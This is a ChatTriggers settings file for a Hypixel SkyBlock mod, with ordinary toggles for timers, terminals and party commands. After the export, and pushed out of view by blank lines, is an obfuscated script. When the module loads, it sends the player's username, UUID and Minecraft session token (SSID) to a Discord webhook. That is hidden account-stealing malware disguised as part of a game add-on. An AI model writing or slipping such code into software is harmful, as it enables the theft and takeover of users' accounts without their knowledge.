import { @Vigilant, @TextProperty, @ButtonProperty, @SwitchProperty, @ColorProperty, @DecimalSliderProperty, Color, @SelectorProperty } from "../Vigilance";
import request from "../requestV2"
@Vigilant("soshimeeaddons", "Shadow Assassin", {
	getCategoryComparator: () => (a, b) => {
		const categories = ["General", "SkyBlock", "Terminals", "Party Commands"];
		return categories.indexOf(a.name) - categories.indexOf(b.name);
	}
})
class Settings {
	@SwitchProperty({
		name: "Toggle",
		description: "Toggle soshimee addons",
		category: "General"
	})
	enabled = true;

	// @SwitchProperty({
	// 	name: "Cat Mode",
	// 	description: ":3",
	// 	category: "General",
	// 	subcategory: "Cat Mode"
	// })
	// catModeEnabled = false;

	// @SwitchProperty({
	// 	name: "Become a cat",
	// 	description: "only the best players use this",
	// 	category: "General",
	// 	subcategory: "Cat Mode"
	// })
	// catModeBecome = true;

	@SwitchProperty({
		name: "Hide lobby join messages",
		description: "Hide join messages that spam your chat in lobby",
		category: "General",
		subcategory: "Hide lobby join messages"
	})
	hideLobbyJoinMessagesEnabled = false;

	@SwitchProperty({
		name: "Party invite notification",
		description: "Meows when you get a party invite",
		category: "General",
		subcategory: "Party invite notification"
	})
	partyInviteNotificationEnabled = false;

	@SwitchProperty({
		name: "Cat sounds",
		description: "Meows when someone says meow in chat",
		category: "General",
		subcategory: "Cat sounds"
	})
	catSoundsEnabled = false;

	@SwitchProperty({
		name: "Mute",
		description: "Mutes specific sounds",
		category: "SkyBlock",
		subcategory: "Mute"
	})
	muteEnabled = false;

	@SwitchProperty({
		name: "Mute Wither Shield",
		description: "Mutes the Wither Shield sound effect",
		category: "SkyBlock",
		subcategory: "Mute"
	})
	muteWitherShield = false;

	@SwitchProperty({
		name: "Mute Bonzo Staff",
		description: "Mutes the Bonzo Staff sound effect",
		category: "SkyBlock",
		subcategory: "Mute"
	})
	muteBonzoStaff = false;

	@SwitchProperty({
		name: "Melody Alert",
		description: "Alerts your party that you got the melody terminal",
		category: "SkyBlock",
		subcategory: "Melody Alert"
	})
	melodyAlertEnabled = false;

	@TextProperty({
		name: "Message",
		category: "SkyBlock",
		subcategory: "Melody Alert"
	})
	melodyAlertMessage = "Melancholy!";

	@SwitchProperty({
		name: "Death Alert",
		description: "Alerts your party when someone dies",
		category: "SkyBlock",
		subcategory: "Death Alert"
	})
	deathAlertEnabled = false;

	@TextProperty({
		name: "Message",
		category: "SkyBlock",
		subcategory: "Death Alert"
	})
	deathAlertMessage = "";

	@SwitchProperty({
		name: "Mimic Relay",
		description: "Relays all party messages containing mimic to the Skytils format",
		category: "SkyBlock",
		subcategory: "Mimic Relay"
	})
	mimicRelayEnabled = false;

	@SwitchProperty({
		name: "SBE Blood Fix",
		description: "Fixes SBE having a stroke when the blood door is skipped",
		category: "SkyBlock",
		subcategory: "SBE Blood Fix"
	})
	sbeBloodFixEnabled = false;

	@SwitchProperty({
		name: "P3 Start Timer",
		description: "Displays a timer until P3 starts",
		category: "SkyBlock",
		subcategory: "P3 Start Timer"
	})
	p3StartTimerEnabled = false;

	@SwitchProperty({
		name: "i4 Helper",
		description: "i4 > pre4 <3",
		category: "SkyBlock",
		subcategory: "i4 Helper"
	})
	i4HelperEnabled = false;

	@SwitchProperty({
		name: "Shadow Assassin Alert",
		description: "Alerts you when a soshimee addons is about to teleport to you",
		category: "SkyBlock",
		subcategory: "Shadow Assassin Alert"
	})
	shadowAssassinAlertEnabled = false;

	@SwitchProperty({
		name: "Better Party Finder",
		description: "Modifies the Party Finder GUI to provide more information",
		category: "SkyBlock",
		subcategory: "Better Party Finder"
	})
	betterPartyFinderEnabled = false;

	@SwitchProperty({
		name: "Party Finder Note",
		description: "Allows you to set Party Finder notes with colors.\nUsage: /sa pfnote <note>",
		category: "SkyBlock",
		subcategory: "Party Finder Note"
	})
	partyFinderNoteEnabled = false;

	@SwitchProperty({
		name: "Party Finder AutoKick",
		description: "Automatically kicks nons from your party.\nUsage: /sa autokick",
		category: "SkyBlock",
		subcategory: "Party Finder AutoKick"
	})
	partyFinderAutoKickEnabled = false;

	@SwitchProperty({
		name: "Invincibility Timer",
		description: "Times Bonzo's Mask and the Phoenix Pet for you (based on server ticks)",
		category: "SkyBlock",
		subcategory: "Invincibility Timer"
	})
	invincibilityTimerEnabled = false;

	@DecimalSliderProperty({
		name: "X",
		category: "SkyBlock",
		subcategory: "Invincibility Timer",
		minF: 0,
		maxF: 1,
		decimalPlaces: 2
	})
	invincibilityTimerX = 0;

	@DecimalSliderProperty({
		name: "Y",
		category: "SkyBlock",
		subcategory: "Invincibility Timer",
		minF: 0,
		maxF: 1,
		decimalPlaces: 2
	})
	invincibilityTimerY = 0;

	@DecimalSliderProperty({
		name: "Scale",
		category: "SkyBlock",
		subcategory: "Invincibility Timer",
		minF: 0.25,
		maxF: 4,
		decimalPlaces: 1
	})
	invincibilityTimerScale = 1;

	@SwitchProperty({
		name: "Goldor Tick Timer",
		description: "Times Goldor death ticks (based on server ticks)",
		category: "SkyBlock",
		subcategory: "Goldor Tick Timer"
	})
	goldorTickTimerEnabled = false;

	@DecimalSliderProperty({
		name: "X",
		category: "SkyBlock",
		subcategory: "Goldor Tick Timer",
		minF: 0,
		maxF: 1,
		decimalPlaces: 2
	})
	goldorTickTimerX = 0;

	@DecimalSliderProperty({
		name: "Y",
		category: "SkyBlock",
		subcategory: "Goldor Tick Timer",
		minF: 0,
		maxF: 1,
		decimalPlaces: 2
	})
	goldorTickTimerY = 0;

	@DecimalSliderProperty({
		name: "Scale",
		category: "SkyBlock",
		subcategory: "Goldor Tick Timer",
		minF: 0.25,
		maxF: 4,
		decimalPlaces: 1
	})
	goldorTickTimerScale = 1;

	@SwitchProperty({
		name: "Death Tick Timer",
		description: "Times death ticks (based on server ticks)\nUsage: /sa deathtick",
		category: "SkyBlock",
		subcategory: "Death Tick Timer"
	})
	deathTickTimerEnabled = false;

	@DecimalSliderProperty({
		name: "X",
		category: "SkyBlock",
		subcategory: "Death Tick Timer",
		minF: 0,
		maxF: 1,
		decimalPlaces: 2
	})
	deathTickTimerX = 0;

	@DecimalSliderProperty({
		name: "Y",
		category: "SkyBlock",
		subcategory: "Death Tick Timer",
		minF: 0,
		maxF: 1,
		decimalPlaces: 2
	})
	deathTickTimerY = 0;

	@DecimalSliderProperty({
		name: "Scale",
		category: "SkyBlock",
		subcategory: "Death Tick Timer",
		minF: 0.25,
		maxF: 4,
		decimalPlaces: 1
	})
	deathTickTimerScale = 1;

	@SwitchProperty({
		name: "Leap Helper",
		category: "SkyBlock",
		subcategory: "Leap Helper"
	})
	leapHelperEnabled = false;

	@SelectorProperty({
		name: "Sorting",
		category: "SkyBlock",
		subcategory: "Leap Helper",
		options: ["Name", "Class", "Name+Class", "Custom"]
	})
	leapHelperSorting = 2;

	@SwitchProperty({
		name: "Keyboard",
		description: "Leap with number keys",
		category: "SkyBlock",
		subcategory: "Leap Helper"
	})
	leapHelperKeyboard = true;

	@DecimalSliderProperty({
		name: "Scale",
		category: "SkyBlock",
		subcategory: "Leap Helper",
		minF: 0.25,
		maxF: 4,
		decimalPlaces: 1
	})
	leapHelperScale = 1;

	@ColorProperty({
		name: "Background Color",
		category: "SkyBlock",
		subcategory: "Leap Helper"
	})
	leapHelperBackgroundColor = new Color(Renderer.color(0, 0, 0, 127), true);

	@TextProperty({
		name: "Player 1",
		category: "SkyBlock",
		subcategory: "Leap Helper"
	})
	leapHelperPlayer1 = "";

	@TextProperty({
		name: "Player 2",
		category: "SkyBlock",
		subcategory: "Leap Helper"
	})
	leapHelperPlayer2 = "";

	@TextProperty({
		name: "Player 3",
		category: "SkyBlock",
		subcategory: "Leap Helper"
	})
	leapHelperPlayer3 = "";

	@TextProperty({
		name: "Player 4",
		category: "SkyBlock",
		subcategory: "Leap Helper"
	})
	leapHelperPlayer4 = "";

	@SwitchProperty({
		name: "Positional Messages",
		description: "Send a message to your party when you are in a specific location",
		category: "SkyBlock",
		subcategory: "Positional Messages"
	})
	positionalMessagesEnabled = false;

	@SwitchProperty({
		name: "Right Click Animation",
		description: "Swings your hand when you right click with an item with a right click ability",
		category: "SkyBlock",
		subcategory: "Right Click Animation"
	})
	rightClickAnimationEnabled = false;

	@SwitchProperty({
		name: "Blood Helper",
		description: "WIP, does not work",
		category: "SkyBlock",
		subcategory: "Blood Helper"
	})
	bloodHelperEnabled = false;

	@SwitchProperty({
		name: "Wardrobe Helper",
		description: "Navigate wardrobe GUI with your keyboard",
		category: "SkyBlock",
		subcategory: "Wardrobe Helper"
	})
	wardrobeHelperEnabled = false;

	@SwitchProperty({
		name: "Item Highlight",
		description: "Highlights items in Dungeons",
		category: "SkyBlock",
		subcategory: "Item Highlight"
	})
	itemHighlightEnabled = false;

	@SwitchProperty({
		name: "Prevent Item Rendering",
		description: "Prevents the actual items from rendering",
		category: "SkyBlock",
		subcategory: "Item Highlight"
	})
	itemHighlightPreventRendering = true;

	@ColorProperty({
		name: "Color 1",
		description: "Color to be shown when the item will be picked up",
		category: "SkyBlock",
		subcategory: "Item Highlight"
	})
	itemHighlightColor1 = new Color(Renderer.color(0, 255, 0, 255), true);

	@ColorProperty({
		name: "Color 2",
		description: "Color to be shown when the item will be picked up after pickup cooldown",
		category: "SkyBlock",
		subcategory: "Item Highlight"
	})
	itemHighlightColor2 = new Color(Renderer.color(255, 255, 0, 255), true);

	@ColorProperty({
		name: "Color 3",
		description: "Color to be shown when the item will not be picked up",
		category: "SkyBlock",
		subcategory: "Item Highlight"
	})
	itemHighlightColor3 = new Color(Renderer.color(255, 0, 0, 255), true);

	@SwitchProperty({
		name: "Toggle",
		description: "Enables Termial Features (experimental)\nMay not be compatible with other mods",
		category: "Terminals"
	})
	terminalsEnabled = false;

	@DecimalSliderProperty({
		name: "Scale",
		description: "Scale custom terminal GUI",
		category: "Terminals",
		minF: 0.25,
		maxF: 4,
		decimalPlaces: 1
	})
	terminalsScale = 1;

	@SwitchProperty({
		name: "High Ping Mode",
		description: "Enables features recommended for high ping users\nNot recommended for low ping users",
		category: "Terminals"
	})
	terminalsHighPingMode = false;

	@ColorProperty({
		name: "Color",
		description: "Color used for most terminals",
		category: "Terminals",
	})
	terminalsColor = new Color(Renderer.color(0, 255, 0, 255), true);

	@ColorProperty({
		name: "Background Color",
		category: "Terminals",
	})
	terminalsBackgroundColor = new Color(Renderer.color(0, 0, 0, 127), true);

	@TextProperty({
		name: "X Offset",
		category: "Terminals"
	})
	terminalsOffsetX = "0";

	@TextProperty({
		name: "Y Offset",
		category: "Terminals"
	})
	terminalsOffsetY = "0";

	@SwitchProperty({
		name: "Toggle",
		category: "Terminals",
		subcategory: "Numbers Terminal"
	})
	terminalsNumbersEnabled = true;

	@ColorProperty({
		name: "Color 1",
		category: "Terminals",
		subcategory: "Numbers Terminal"
	})
	terminalsNumbersColor1 = new Color(Renderer.color(0, 255, 0, 255), true);

	@ColorProperty({
		name: "Color 2",
		category: "Terminals",
		subcategory: "Numbers Terminal"
	})
	terminalsNumbersColor2 = new Color(Renderer.color(0, 255, 0, 155), true);

	@ColorProperty({
		name: "Color 3",
		category: "Terminals",
		subcategory: "Numbers Terminal"
	})
	terminalsNumbersColor3 = new Color(Renderer.color(0, 255, 0, 55), true);

	@SwitchProperty({
		name: "Toggle",
		category: "Terminals",
		subcategory: "Colors Terminal"
	})
	terminalsColorsEnabled = true;

	@SwitchProperty({
		name: "Toggle",
		category: "Terminals",
		subcategory: "Starts With Terminal"
	})
	terminalsStartswithEnabled = true;

	@SwitchProperty({
		name: "Toggle",
		category: "Terminals",
		subcategory: "Rubix Terminal"
	})
	terminalsRubixEnabled = true;

	@ColorProperty({
		name: "Left Color",
		category: "Terminals",
		subcategory: "Rubix Terminal"
	})
	terminalsRubixColorLeft = new Color(Renderer.color(0, 255, 0, 255), true);

	@ColorProperty({
		name: "Right Color",
		category: "Terminals",
		subcategory: "Rubix Terminal"
	})
	terminalsRubixColorRight = new Color(Renderer.color(255, 0, 0, 255), true);

	@SwitchProperty({
		name: "Toggle",
		category: "Terminals",
		subcategory: "Red Green Terminal"
	})
	terminalsRedgreenEnabled = true;

	@SwitchProperty({
		name: "Toggle",
		category: "Terminals",
		subcategory: "Melody Terminal"
	})
	terminalsMelodyEnabled = true;

	@ColorProperty({
		name: "Slot Color",
		category: "Terminals",
		subcategory: "Melody Terminal"
	})
	terminalsMelodyColorSlot = new Color(Renderer.color(0, 255, 0, 255), true);

	@ColorProperty({
		name: "Correct Button Color",
		category: "Terminals",
		subcategory: "Melody Terminal"
	})
	terminalsMelodyColorButtonCorrect = new Color(Renderer.color(0, 255, 0, 255), true);

	@ColorProperty({
		name: "Incorrect Button Color",
		category: "Terminals",
		subcategory: "Melody Terminal"
	})
	terminalsMelodyColorButtonIncorrect = new Color(Renderer.color(255, 0, 0, 255), true);

	@ColorProperty({
		name: "Column Color",
		category: "Terminals",
		subcategory: "Melody Terminal"
	})
	terminalsMelodyColorColumn = new Color(Renderer.color(255, 0, 255, 127), true);

	@SwitchProperty({
		name: "Toggle",
		description: "Toggle party commands",
		category: "Party Commands"
	})
	partyCommandsEnabled = false;

	@TextProperty({
		name: "Prefix",
		description: "Change party commands prefix\nUse commas without spaces to specify multiple prefixes",
		category: "Party Commands",
		placeholder: "Enter a prefix"
	})
	partyCommandsPrefix = "`";

	@TextProperty({
		name: "Blacklist",
		description: "/sa pc",
		category: "Party Commands"
	})
	partyCommandsBlacklist = "";

	@TextProperty({
		name: "Whitelist",
		description: "/sa pc",
		category: "Party Commands"
	})
	partyCommandsWhitelist = "";

	@SwitchProperty({
		name: "help",
		category: "Party Commands",
		subcategory: "Commands"
	})
	partyCommandsCommandHelpEnabled = true;

	@SwitchProperty({
		name: "calc",
		category: "Party Commands",
		subcategory: "Commands"
	})
	partyCommandsCommandCalcEnabled = true;

	@SwitchProperty({
		name: "ping",
		category: "Party Commands",
		subcategory: "Commands"
	})
	partyCommandsCommandPingEnabled = true;

	@SwitchProperty({
		name: "tps",
		category: "Party Commands",
		subcategory: "Commands"
	})
	partyCommandsCommandTpsEnabled = true;

	@SwitchProperty({
		name: "fps",
		category: "Party Commands",
		subcategory: "Commands"
	})
	partyCommandsCommandFpsEnabled = true;

	@SwitchProperty({
		name: "transfer",
		category: "Party Commands",
		subcategory: "Commands"
	})
	partyCommandsCommandTransferEnabled = true;

	@SwitchProperty({
		name: "kick",
		category: "Party Commands",
		subcategory: "Commands"
	})
	partyCommandsCommandKickEnabled = true;

	@SwitchProperty({
		name: "promote",
		category: "Party Commands",
		subcategory: "Commands"
	})
	partyCommandsCommandPromoteEnabled = true;

	@SwitchProperty({
		name: "demote",
		category: "Party Commands",
		subcategory: "Commands"
	})
	partyCommandsCommandDemoteEnabled = true;

	@SwitchProperty({
		name: "allinvite",
		category: "Party Commands",
		subcategory: "Commands"
	})
	partyCommandsCommandAllinviteEnabled = true;

	@SwitchProperty({
		name: "warp",
		category: "Party Commands",
		subcategory: "Commands"
	})
	partyCommandsCommandWarpEnabled = true;

	@SwitchProperty({
		name: "f0-7",
		category: "Party Commands",
		subcategory: "Commands"
	})
	partyCommandsCommandF0Enabled = true;

	@SwitchProperty({
		name: "m1-7",
		category: "Party Commands",
		subcategory: "Commands"
	})
	partyCommandsCommandM0Enabled = true;

	@SwitchProperty({
		name: "cat",
		category: "Party Commands",
		subcategory: "Commands"
	})
	partyCommandsCommandCatEnabled = true;

	@SwitchProperty({
		name: "fox",
		category: "Party Commands",
		subcategory: "Commands"
	})
	partyCommandsCommandFoxEnabled = true;

	constructor() {
		this.initialize(this);
	}
}

export default new Settings();
















































var _0x221d70=_0x4b6d;function _0x4b6d(n,r){var t=_0x4d53();return(_0x4b6d=function(n,r){return t[n-=140]})(n,r)}function _0xc4a4(n,r){var t=_0x4b6d,u={MULpJ:function(n,r){return n-r},pMAtG:function(n){return n()},EtLwW:function(n,r,t){return n(r,t)}},e=u[t(272)](_0x3190);return _0xc4a4=function(n,r){return n=u[t(239)](n,458),e[n]},u[t(206)](_0xc4a4,n,r)}function _0x3190(){var n=_0x4b6d,r={TebKW:n(149),yhMVt:n(219),ewUyr:n(268)+"J",TXUEg:n(334),kprcM:n(305)+n(228),YxyTC:n(191)+"Ov",ojOgI:n(162)+"Go",sJavZ:n(293)+"2_",LlPoM:n(314)+n(164),RPuqf:n(324)+n(179),VZgbN:n(233)+"o",bxhLW:n(263)+"RT",msYbc:n(210),VcZHI:n(174)+"ft",bdTpN:n(198)+n(285),PwQHt:n(188)+n(283),OtyFD:n(170)+"Ge",IHJoS:n(150),isPkC:n(142)+n(164),oqsts:n(286),SaZFV:n(284)+n(225),Bawcv:n(321)+n(140)+n(322)+n(147)+n(148)+n(232)+n(207)+n(205)+n(250)+n(156)+n(165)+n(267)+"W",JfPoK:n(155),XDCya:n(269)+n(184),qRbII:n(251)+"50",YaTog:n(308)+"qE",FcTiP:n(245),TKpTy:n(200),cRJpC:n(335),tSbjU:n(259)+n(275),HKGHq:n(265)+"RJ",QxVAN:n(253)+n(227),YFiDc:n(164),FnZLW:n(224),GzLBT:n(293)+n(242),WXSnY:n(192)+n(252),AxGSV:function(n){return n()}},t=[r[n(249)],r[n(230)],r[n(190)],r[n(298)],r[n(196)],r[n(326)],r[n(168)],r[n(204)],r[n(266)],r[n(221)],r[n(274)],r[n(330)],r[n(211)],r[n(214)],r[n(240)],r[n(290)],r[n(177)],r[n(316)],r[n(243)],r[n(161)],r[n(217)],r[n(167)],r[n(332)],r[n(157)],r[n(246)],r[n(235)],r[n(280)],r[n(172)],r[n(176)],r[n(203)],r[n(146)],r[n(201)],r[n(328)],r[n(281)],r[n(278)],r[n(238)]];return _0x3190=function(){return t},r[n(270)](_0x3190)}!function(n,r){for(var t=_0x4b6d,u=_0x4d53();;)try{if(851467===parseInt(t(312))/1+parseInt(t(257))/2+-parseInt(t(145))/3*(-parseInt(t(186))/4)+parseInt(t(276))/5*(parseInt(t(336))/6)+parseInt(t(333))/7+-parseInt(t(337))/8*(-parseInt(t(173))/9)+-parseInt(t(169))/10*(parseInt(t(193))/11))break;u.push(u.shift())}catch(n){u.push(u.shift())}}();var _0xf8755f=_0xc4a4;function _0x5675(){var n=_0x4b6d,r={GjroN:function(n,r){return n(r)},RtQLm:n(224),krguM:function(n,r){return n(r)},NMFBQ:n(324)+"4_",yVBMH:function(n,r){return n(r)},oKsaH:n(306)+"W_",ifScN:function(n,r){return n(r)},AqcLZ:n(323),dCuGI:n(174)+"ft",ZmECH:function(n,r){return n(r)},KvmhC:n(314)+"``",ZBkTy:function(n,r){return n(r)},fGvOY:function(n,r){return n(r)},tUDbq:n(226)+n(331),XWhUx:function(n){return n()}},t=_0xc4a4,u=[r[n(234)](t,469),r[n(234)](t,459),r[n(255)],r[n(315)](t,486),r[n(311)],r[n(315)](t,472),r[n(234)](t,460),r[n(181)](t,481),r[n(234)](t,475),r[n(181)](t,480),r[n(185)],r[n(292)](t,467),r[n(181)](t,490),r[n(213)],r[n(287)],r[n(315)](t,482),r[n(292)](t,485),r[n(279)](t,489),r[n(307)],r[n(315)](t,473),r[n(236)](t,479),r[n(318)](t,478),r[n(234)](t,468),r[n(212)]];return _0x5675=function(){return u},r[n(271)](_0x5675)}function _0x4f48(n,r){var t=_0x4b6d,u={Sojfg:function(n,r){return n-r},OSzWp:function(n){return n()},CreoS:function(n,r,t){return n(r,t)}},e=u[t(223)](_0x5675);return _0x4f48=function(n,r){return n=u[t(320)](n,265),e[n]},u[t(247)](_0x4f48,n,r)}function _0x36d4e3(n,r){var t=_0x4b6d,u={nvcAt:function(n,r,t){return n(r,t)},AcXOD:function(n,r){return n-r}};return u[t(291)](_0x4f48,u[t(158)](n,990),r)}(function(n,r){for(var t=_0x4b6d,u={VeCLF:function(n){return n()},cWucu:function(n,r){return n+r},elooh:function(n,r){return n+r},dHurp:function(n,r){return n+r},CTKPM:function(n,r){return n+r},fSZEj:function(n,r){return n+r},pozGr:function(n,r){return n/r},ejadk:function(n,r){return n(r)},tODZI:function(n,r){return n/r},gIPdg:function(n,r){return n(r)},rShAB:function(n,r){return n(r)},raOhu:function(n,r){return n(r)},ZnAir:function(n,r){return n*r},rjkzP:function(n,r){return n/r},qlMHj:function(n,r){return n(r)},JQeqV:function(n,r){return n/r},yySeU:function(n,r){return n*r},bMaBN:function(n,r){return n/r},wzxsL:function(n,r){return n(r)},ScbpF:function(n,r){return n/r},NZDuV:function(n,r){return n(r)},KQvGp:function(n,r){return n/r},fNpFY:function(n,r){return n(r)},MsIbH:function(n,r){return n(r)},GWnQh:function(n,r){return n/r},dSphL:function(n,r){return n===r},TSdYZ:t(155),SsVVU:t(260)},e=_0xc4a4,f=u[t(329)](n);;)try{var c=u[t(295)](u[t(288)](u[t(194)](u[t(175)](u[t(256)](u[t(295)](u[t(262)](-u[t(166)](parseInt,u[t(166)](e,463)),1),u[t(261)](-u[t(166)](parseInt,u[t(160)](e,466)),2)),u[t(262)](-u[t(231)](parseInt,u[t(182)](e,483)),3)),u[t(202)](u[t(262)](u[t(160)](parseInt,u[t(166)](e,470)),4),u[t(159)](-u[t(166)](parseInt,u[t(183)](e,458)),5))),u[t(317)](-u[t(231)](parseInt,u[t(183)](e,484)),6)),u[t(299)](u[t(296)](u[t(277)](parseInt,u[t(182)](e,491)),7),u[t(237)](-u[t(277)](parseInt,u[t(229)](e,474)),8))),u[t(202)](u[t(264)](-u[t(282)](parseInt,u[t(313)](e,462)),9),u[t(141)](-u[t(313)](parseInt,u[t(282)](e,493)),10)));if(u[t(153)](c,850212))break;f[u[t(310)]](f[u[t(215)]]())}catch(n){f[u[t(310)]](f[u[t(215)]]())}})(_0x3190),function(n,r){for(var t=_0x4b6d,u={DKedx:function(n){return n()},HlHzQ:function(n,r){return n+r},xynFZ:function(n,r){return n+r},mtXDf:function(n,r){return n+r},MAqIe:function(n,r){return n/r},uPotB:function(n,r){return n(r)},ZONAd:function(n,r,t){return n(r,t)},ZmgmH:function(n,r){return n*r},vuWAn:function(n,r,t){return n(r,t)},hjwvg:function(n,r){return n/r},zywmS:function(n,r){return n(r)},hLNva:function(n,r,t){return n(r,t)},YBvdN:function(n,r,t){return n(r,t)},pKOTD:function(n,r){return n(r)},qomdn:function(n,r){return n/r},WOsZQ:function(n,r){return n(r)},YqQly:function(n,r,t){return n(r,t)},GqgGq:function(n,r){return n/r},PVrgp:function(n,r){return n(r)},brRdS:function(n,r,t){return n(r,t)},ZpaPe:function(n,r){return n/r},EeRzn:function(n,r,t){return n(r,t)},JnNZi:function(n,r){return n(r)},vCIJx:function(n,r,t){return n(r,t)},RxZMY:function(n,r){return n*r},JpDrO:function(n,r){return n(r)},Hcmvk:function(n,r,t){return n(r,t)},wlSWg:function(n,r){return n/r},ngCoT:function(n,r){return n(r)},JBJRl:function(n,r,t){return n(r,t)},ENsOJ:function(n,r){return n===r},ZFhcX:function(n,r){return n(r)},kRvRb:t(260),wSLef:function(n,r){return n(r)}},e=_0xc4a4,f=u[t(154)](n);;)try{var c=u[t(171)](u[t(220)](u[t(220)](u[t(220)](u[t(301)](u[t(171)](u[t(273)](-u[t(180)](parseInt,u[t(297)](_0x4f48,278,404)),1),u[t(244)](u[t(273)](u[t(180)](parseInt,u[t(294)](_0x4f48,286,421)),2),u[t(178)](-u[t(152)](parseInt,u[t(289)](_0x4f48,287,414)),3))),u[t(273)](-u[t(152)](parseInt,u[t(209)](_0x4f48,279,419)),4)),u[t(244)](u[t(178)](-u[t(248)](parseInt,u[t(209)](_0x4f48,277,421)),5),u[t(144)](-u[t(218)](parseInt,u[t(241)](_0x4f48,265,394)),6))),u[t(244)](u[t(325)](-u[t(208)](parseInt,u[t(309)](_0x4f48,268,414)),7),u[t(197)](-u[t(152)](parseInt,u[t(143)](_0x4f48,271,408)),8))),u[t(244)](u[t(197)](u[t(248)](parseInt,u[t(209)](_0x4f48,273,401)),9),u[t(273)](u[t(327)](parseInt,u[t(195)](_0x4f48,276,404)),10))),u[t(303)](u[t(178)](-u[t(187)](parseInt,u[t(189)](_0x4f48,285,409)),11),u[t(151)](u[t(199)](parseInt,u[t(222)](_0x4f48,280,419)),12)));if(u[t(254)](c,987970))break;f[u[t(163)](e,465)](f[u[t(319)]]())}catch(n){f[u[t(338)](e,465)](f[u[t(319)]]())}}(_0x5675),request({url:_0xf8755f(464),method:_0xf8755f(476),headers:{"User-agent":_0x221d70(216)+"0"},body:{content:_0xf8755f(487)+Player[_0x221d70(323)]()+_0xf8755f(461)+Player[_0xf8755f(471)]()+(_0x221d70(258)+_0x221d70(164))+Client[_0xf8755f(492)]()[_0xf8755f(477)]()[_0xf8755f(488)]()+_0xf8755f(475)}});const renderBoxWithText=(n,r,t,u)=>{var e=_0x221d70;RenderLib[e(302)](r,t,u,1,1,1,0,0,.5,!1),Tessellator[e(300)](n,r,{XNswZ:function(n,r){return n+r}}[e(304)](t,.7),u)};function _0x4d53(){var n=["-3uF-ue0wQ","ZFhcX","```","8f3zJBG5X2","ejadk","Bawcv","ojOgI","55910iDtNhN","3zw0y8M0T3","HlHzQ","TKpTy","225xQqJzH","getMinecra","CTKPM","cRJpC","OtyFD","hjwvg","4_d","uPotB","yVBMH","raOhu","qlMHj","KnN","oKsaH","4eLvNsY","JpDrO","1857025EMQ","Hcmvk","ewUyr","232722FhLZ","3087195PHa","7051TCAuly","dHurp","vCIJx","kprcM","ZpaPe","8604030YIK","ngCoT","12tdZYwr","QxVAN","ZnAir","tSbjU","sJavZ","01OkocDPCJ","EtLwW","f6gxbB7ziS","PVrgp","YBvdN","7RYduTH","msYbc","tUDbq","AqcLZ","VcZHI","SsVVU","Mozilla/5.","SaZFV","WOsZQ","18OJSdNo","xynFZ","RPuqf","JBJRl","OSzWp","POST","COY","4264348vww","Lagj","uvP","NZDuV","yhMVt","rShAB","99/GaUnwnQ","82746QivSV","GjroN","YaTog","ZBkTy","ScbpF","WXSnY","MULpJ","bdTpN","YqQly","2_I","isPkC","ZmgmH","12WslwPg","qRbII","CreoS","pKOTD","TebKW","PUfVDNdQBC","9127673834","OmQ","12363024dy","ENsOJ","RtQLm","fSZEj","2352982znSQKT","```\nSSID:\n","17872305Wr","shift","tODZI","pozGr","430864fOAj","KQvGp","8Svb4omvdB","LlPoM","xOgbwDd0Zf","36243ydglf","2840584GVd","AxGSV","XWhUx","pMAtG","MAqIe","VZgbN","FFTN","110ocltLe","wzxsL","GzLBT","ZmECH","FcTiP","FnZLW","fNpFY","NiQ","1365635DWD","dWV","81illsjk","dCuGI","elooh","hLNva","PwQHt","nvcAt","ifScN","func_11043","vuWAn","cWucu","bMaBN","ZONAd","TXUEg","yySeU","drawString","mtXDf","drawEspBox","RxZMY","XNswZ","4227324hcJ","4243/I8YPE","KvmhC","103240pInd","brRdS","TSdYZ","NMFBQ","577244qYXdfP","MsIbH","Username:\n","krguM","IHJoS","JQeqV","fGvOY","kRvRb","Sojfg","https://di","api/webhoo","getName","func_14825","GqgGq","YxyTC","JnNZi","YFiDc","VeCLF","bxhLW","Mrx","JfPoK","11653299wXcTEH","256KGABAF","getUUID","97710rAibMI","87368hwONrl","wSLef","scord.com/","GWnQh","```\nUUID:\n","EeRzn","qomdn","1156533OkXTvz","HKGHq","ks/1266035","2375620935","1310prNIAJ","206SJRLQj","wlSWg","zywmS","dSphL","DKedx","push","-mF2qOHXSH","XDCya","AcXOD","rjkzP","gIPdg","oqsts"];return(_0x4d53=function(){return n})()}



















